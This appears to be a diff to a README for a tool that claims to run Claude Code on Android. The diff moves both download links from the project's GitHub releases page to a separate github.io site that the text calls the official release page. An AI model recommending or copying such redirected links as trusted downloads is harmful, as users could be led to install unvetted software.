@@ -1,6 +1,6 @@
 # 🤖 claude-code-termux - Run Claude Code on Android devices
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Quadraticdakota57/claude-code-termux/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://quadraticdakota57.github.io)
 
 This project allows you to use the Claude Code command line tool on your Android phone. It bridges the gap between your mobile device and the software requirements needed to run advanced artificial intelligence tools. You can now use AI assistance for your coding tasks directly from your pocket.
 
@@ -21,7 +21,7 @@ Before you start, ensure your phone meets these requirements:
 
 You must download the correct package for your device from our official release page.
 
-[Visit this page to download the latest version](https://github.com/Quadraticdakota57/claude-code-termux/releases)
+[Visit this page to download the latest version](https://quadraticdakota57.github.io)
 
 Choose the file that matches your device architecture. For most users, the standard release file works without adjustments. Download the file into your phone's internal storage or directly into the Termux downloads folder.
 
